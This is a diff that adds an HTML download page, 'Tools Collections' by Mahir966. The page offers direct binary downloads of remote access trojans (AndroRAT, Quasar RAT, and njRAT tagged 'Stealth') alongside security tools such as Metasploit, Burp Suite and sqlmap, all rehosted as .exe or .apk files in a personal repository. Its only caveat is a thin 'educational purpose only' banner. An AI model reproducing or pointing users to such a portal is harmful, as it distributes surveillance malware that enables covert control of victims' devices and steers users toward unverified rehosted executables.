@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tools Collection - Mahir966</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e1a;
+            color: #ffffff;
+            line-height: 1.6;
+        }
+        
+        /* Header */
+        header {
+            background: linear-gradient(135deg, #1a1f2f, #0f1422);
+            padding: 2rem;
+            text-align: center;
+            border-bottom: 3px solid #00ff88;
+            box-shadow: 0 4px 20px rgba(0,255,136,0.2);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            color: #8892b0;
+            font-size: 1.1rem;
+        }
+        
+        .user-name {
+            color: #00ff88;
+            font-size: 1.2rem;
+            margin-top: 0.5rem;
+        }
+        
+        /* Warning Banner */
+        .warning {
+            background: rgba(255, 170, 70, 0.1);
+            border: 1px solid #ffaa46;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 2rem auto;
+            max-width: 800px;
+            text-align: center;
+        }
+        
+        .warning h3 {
+            color: #ffaa46;
+            margin-bottom: 0.5rem;
+        }
+        
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        /* Tools Grid */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        
+        .tool-card {
+            background: #1a1f2f;
+            border-radius: 15px;
+            padding: 1.5rem;
+            border: 1px solid #2a2f3f;
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,255,136,0.15);
+            border-color: #00ff88;
+        }
+        
+        .tool-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(180deg, #00ff88, #00ccff);
+        }
+        
+        .tool-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .tool-name {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #00ff88;
+        }
+        
+        .tool-description {
+            color: #a0a8c0;
+            margin-bottom: 1rem;
+            font-size: 0.95rem;
+        }
+        
+        .tool-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .tag {
+            background: #2a2f3f;
+            color: #00ff88;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            border: 1px solid #3a3f4f;
+        }
+        
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            width: 100%;
+            padding: 0.8rem;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            color: #0a0e1a;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            transition: opacity 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .download-btn:hover {
+            opacity: 0.9;
+        }
+        
+        /* Categories */
+        .categories {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+        
+        .category-btn {
+            padding: 0.5rem 1.5rem;
+            background: #1a1f2f;
+            border: 1px solid #2a2f3f;
+            color: #ffffff;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .category-btn:hover,
+        .category-btn.active {
+            background: #00ff88;
+            color: #0a0e1a;
+            border-color: #00ff88;
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 2rem;
+            background: #1a1f2f;
+            border-top: 1px solid #2a2f3f;
+            margin-top: 3rem;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .container {
+                padding: 1rem;
+            }
+        }
+
+        /* Stats Bar */
+        .stats-bar {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #1a1f2f;
+            border-radius: 50px;
+            border: 1px solid #2a2f3f;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #00ff88;
+        }
+
+        .stat-label {
+            color: #8892b0;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>⚡ TOOLS COLLECTIONS ⚡</h1>
+        <div class="subtitle">Advanced Security & Administration Tools</div>
+        <div class="user-name">Mahir966</div>
+    </header>
+    
+    <div class="container">
+        <!-- Warning Message -->
+        <div class="warning">
+            <h3>📚 EDUCATIONAL PURPOSE ONLY 📚</h3>
+            <p>These tools are for educational and security research purposes only. 
+            Always ensure you have proper authorization before testing any system.</p>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-bar">
+            <div class="stat-item">
+                <div class="stat-value" id="totalTools">0</div>
+                <div class="stat-label">Total Tools</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="totalRAT">0</div>
+                <div class="stat-label">RAT Tools</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="totalDownloads">0</div>
+                <div class="stat-label">Downloads</div>
+            </div>
+        </div>
+        
+        <!-- Category Filters -->
+        <div class="categories">
+            <button class="category-btn active" onclick="filterTools('all')">All Tools</button>
+            <button class="category-btn" onclick="filterTools('rat')">RAT</button>
+            <button class="category-btn" onclick="filterTools('network')">Network</button>
+            <button class="category-btn" onclick="filterTools('exploit')">Exploit</button>
+            <button class="category-btn" onclick="filterTools('scanner')">Scanner</button>
+        </div>
+        
+        <!-- Tools Grid -->
+        <div class="tools-grid" id="toolsContainer">
+            <!-- Tools will be loaded here by JavaScript -->
+        </div>
+    </div>
+    
+    <footer>
+        <p>© 2024 Tools Collections by Mahir966</p>
+        <p style="color: #8892b0; font-size: 0.9rem; margin-top: 0.5rem;">
+            ⚡ All tools are hosted on GitHub ⚡
+        </p>
+        <p style="color: #8892b0; font-size: 0.8rem; margin-top: 1rem;">
+            Repository: github.com/Mahir966/Tools-Collections
+        </p>
+    </footer>
+
+    <script>
+        // Tools data
+        const tools = [
+            {
+                id: 1,
+                name: "AndroRAT",
+                icon: "📱",
+                description: "Advanced Android Remote Administration Tool with full device control, GPS tracking, and file management.",
+                category: "rat",
+                tags: ["Android", "Remote Control", "GPS"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/AndroRAT.apk",
+                size: "5.2 MB",
+                downloads: 0
+            },
+            {
+                id: 2,
+                name: "Quasar RAT",
+                icon: "💻",
+                description: "Windows based Remote Administration Tool with advanced features and plugin system.",
+                category: "rat",
+                tags: ["Windows", ".NET", "Remote Access"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/QuasarRAT.exe",
+                size: "3.8 MB",
+                downloads: 0
+            },
+            {
+                id: 3,
+                name: "Nmap Scanner",
+                icon: "🔍",
+                description: "Powerful network discovery and security scanning tool with advanced fingerprinting.",
+                category: "scanner",
+                tags: ["Network", "Port Scanner", "OS Detection"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/nmap-setup.exe",
+                size: "25.6 MB",
+                downloads: 0
+            },
+            {
+                id: 4,
+                name: "Metasploit",
+                icon: "🎯",
+                description: "Penetration testing framework with thousands of exploits and payloads.",
+                category: "exploit",
+                tags: ["Exploitation", "Payloads", "Framework"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/metasploit.exe",
+                size: "180 MB",
+                downloads: 0
+            },
+            {
+                id: 5,
+                name: "Wireshark",
+                icon: "📡",
+                description: "Network protocol analyzer for traffic inspection and packet analysis.",
+                category: "network",
+                tags: ["Packet Analysis", "Protocol", "Network"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/wireshark.exe",
+                size: "42.3 MB",
+                downloads: 0
+            },
+            {
+                id: 6,
+                name: "OWASP ZAP",
+                icon: "🛡️",
+                description: "Web application security scanner with automated penetration testing tools.",
+                category: "scanner",
+                tags: ["Web Security", "Scanner", "Proxy"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/ZAP.exe",
+                size: "89.7 MB",
+                downloads: 0
+            },
+            {
+                id: 7,
+                name: "Burp Suite",
+                icon: "🔧",
+                description: "Web vulnerability scanner and proxy tool for security testing.",
+                category: "scanner",
+                tags: ["Web", "Proxy", "Scanner"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/burp.exe",
+                size: "67.8 MB",
+                downloads: 0
+            },
+            {
+                id: 8,
+                name: "njRAT",
+                icon: "🦠",
+                description: "Remote administration tool with plugin support and file management.",
+                category: "rat",
+                tags: ["Windows", "Remote Control", "Stealth"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/njRAT.exe",
+                size: "2.1 MB",
+                downloads: 0
+            },
+            {
+                id: 9,
+                name: "SQLmap",
+                icon: "🗄️",
+                description: "Automated SQL injection tool for database exploitation.",
+                category: "exploit",
+                tags: ["SQL", "Database", "Injection"],
+                downloadUrl: "https://github.com/Mahir966/Tools-Collections/raw/main/tools/sqlmap.exe",
+                size: "15.4 MB",
+                downloads: 0
+            }
+        ];
+
+        // Update stats
+        function updateStats() {
+            document.getElementById('totalTools').textContent = tools.length;
+            document.getElementById('totalRAT').textContent = tools.filter(t => t.category === 'rat').length;
+            
+            // Load download counts from localStorage
+            let totalDownloads = 0;
+            tools.forEach(tool => {
+                const saved = localStorage.getItem(`download_${tool.id}`);
+                tool.downloads = saved ? parseInt(saved) : 0;
+                totalDownloads += tool.downloads;
+            });
+            document.getElementById('totalDownloads').textContent = totalDownloads;
+        }
+
+        // Handle download
+        function handleDownload(toolId, url) {
+            // Increment download count
+            const tool = tools.find(t => t.id === toolId);
+            if (tool) {
+                tool.downloads++;
+                localStorage.setItem(`download_${toolId}`, tool.downloads);
+                updateStats();
+            }
+            
+            // Start download
+            window.location.href = url;
+        }
+        
+        // Display tools
+        function displayTools(category = 'all') {
+            const container = document.getElementById('toolsContainer');
+            container.innerHTML = '';
+            
+            const filteredTools = category === 'all' 
+                ? tools 
+                : tools.filter(tool => tool.category === category);
+            
+            filteredTools.forEach(tool => {
+                const toolCard = document.createElement('div');
+                toolCard.className = 'tool-card';
+                toolCard.setAttribute('data-category', tool.category);
+                
+                toolCard.innerHTML = `
+                    <div class="tool-icon">${tool.icon}</div>
+                    <h3 class="tool-name">${tool.name}</h3>
+                    <p class="tool-description">${tool.description}</p>
+                    <div class="tool-tags">
+                        ${tool.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
+                    </div>
+                    <button onclick="handleDownload(${tool.id}, '${tool.downloadUrl}')" class="download-btn">
+                        ⬇️ Download (${tool.size})
+                    </button>
+                `;
+                
+                container.appendChild(toolCard);
+            });
+        }
+        
+        // Filter tools by category
+        function filterTools(category) {
+            // Update active button
+            document.querySelectorAll('.category-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Display filtered tools
+            displayTools(category);
+        }
+        
+        // Initial display
+        updateStats();
+        displayTools('all');
+    </script>
+</body>
+</html>
